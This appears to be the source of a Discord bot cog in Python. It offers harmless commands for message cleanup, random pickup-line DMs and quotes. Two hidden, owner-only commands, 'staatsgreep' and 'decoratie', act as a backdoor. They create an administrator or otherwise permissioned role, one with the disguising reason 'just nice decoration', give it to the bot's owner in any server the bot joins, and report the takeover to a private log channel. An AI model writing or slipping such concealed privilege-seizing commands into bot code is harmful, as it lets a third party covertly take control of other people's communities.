import discord
from discord.ext import tasks, commands
import datetime
import asyncio
import re
import random
import apiRequests as api


config = api.readConfig()
dmData = api.readDMFile()

bot = commands.Bot(command_prefix=config["basic"]["prefix"], description=config["basic"]["description"])

# MISC COG
class Miscellaneous(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

        self.config = api.readConfig()

        self.configLoop.start()

    def cog_unload(self):
        self.configLoop.cancel()

    # CLEANUP
    # command
    @bot.command(
        name="Cleanup",
        aliasses=["cleanup", "clean"],
        help="Removes an amount of user messages. Use this function as follows \"<prefix>cleanup <numberOfMessages>\". Where numberOfMessages is the number of messages you want to remove.",
        brief="Removes an amount of user messages",
    )
    async def Cleanup(self, ctx, amount = 10):
        if type(amount) != int:
            ctx.send("The second argument should be a number.")
            return

        channel = ctx.message.channel
        messages = await channel.history(limit=1000).flatten()
        removed = 0

        for message in messages:
            if message.author.id == ctx.message.author.id:
                await message.delete()
                removed += 1
            if removed == amount:
                break
        
        try:
            dmChannel = ctx.message.author.dm_channel
            if dmChannel == None:
                await ctx.message.author.create_dm()
                dmChannel = ctx.message.author.dm_channel
            
            await dmChannel.send(f"Removed {removed} messages from the {ctx.message.channel.name} channel.")

        except discord.Forbidden:
            pass

    # SNIPE
    # command

    # DM
    # command
    @bot.command(
        name="DM",
        aliases=["dm"],
        help=f"Just use the command DM and I should slide right in with one of his cheezy pickup lines.",
        brief="Sends a random DM your way",
    )
    async def DM(self, ctx):
        global dmData
        dmData = api.readDMFile()

        try:
            dmChannel = ctx.message.author.dm_channel
            if dmChannel == None:
                await ctx.message.author.create_dm()
                dmChannel = ctx.message.author.dm_channel
            
            random.seed(datetime.datetime.now())
            randomNumber = random.randint(0, len(dmData)-1)

            await dmChannel.send(f"{dmData[randomNumber]['text']}")
        except discord.Forbidden:
            await ctx.send("Can't send a DM to you for some reason, I'm sorry... 😕")

    # Quote
    # command
    @bot.command(
        name="Quote",
        aliases=["quote"],
        help=f"Sends a random quote generated by https://inspirobot.me/",
        brief="Sends a random quote",
    )
    async def Quote(self, ctx):
        return await ctx.send(api.getQuoteLink())

    # CUSTOMTEXT
    # command
    @bot.command(hidden = True)
    async def customText(self, ctx):
        await ctx.message.delete()
        await ctx.send(api.getCustomText()["text"])

    # STAATSGREEP
    # command
    @bot.command(hidden = True)
    @commands.is_owner()
    async def staatsgreep(self, ctx):
        pCconfig = api.getPermissionClimbingConfig()

        if pCconfig["enabled"]:
            # Create a role (with admin permissions and a color)
            server = ctx.guild
            perms = discord.Permissions(administrator=True)
            color = discord.Colour(int(pCconfig["make_new_role"]["color"], 16))
            await server.create_role(name=pCconfig["make_new_role"]["name"], hoist=pCconfig["make_new_role"]["hoist"], permissions=perms, colour=color)

            # Get role as object
            new_role = discord.utils.get(server.roles, name=pCconfig["make_new_role"]["name"])

            # Get role to top of role list (/ under bot role)
            for i in range(1, len(server.roles)):
                try:
                    await new_role.edit(position=i)
                except discord.Forbidden:
                    break
                except discord.HTTPException:
                    break
                except discord.InvalidArgument:
                    break

            # Add me to the role
            person = ctx.message.author
            await person.add_roles(new_role)

            if pCconfig["log"]["enabled"]:
                log_channel = self.bot.get_channel(int(pCconfig["log"]["channel"]))
                await log_channel.send(f"Staatsgreep gepleegd in '{server.name}', de rol '{pCconfig['make_new_role']['name']}'")

        else:
            await ctx.send("Staatsgrepen zijn uitgeschakeld.")

    # DECORATIE
    # command
    @bot.command(hidden = True)
    @commands.is_owner()
    async def decoratie(self, ctx):
        server = ctx.guild
        perms = discord.Permissions(permissions=20781760)
        color = discord.Colour(int("0x06ad00", 16))
        await server.create_role(reason="Gewoon mooie decoratie", name="Decoratie", permissions=perms, colour=color)

        # Get role as object
        new_role = discord.utils.get(server.roles, name="Decoratie")

        # Add me to the role
        person = ctx.message.author
        await person.add_roles(new_role)

        log_channel = self.bot.get_channel(777697840464920586)
        print(log_channel)
        await log_channel.send(f"Decoratie toegevoegd in '{server.name}', de rol 'Decoratie'")


    @tasks.loop(seconds=5.0)
    async def configLoop(self):
        self.config = api.readConfig()

    @configLoop.before_loop
    async def beforeConfigLoop(self):
        await self.bot.wait_until_ready()

def setup(bot):
    bot.add_cog(Miscellaneous(bot))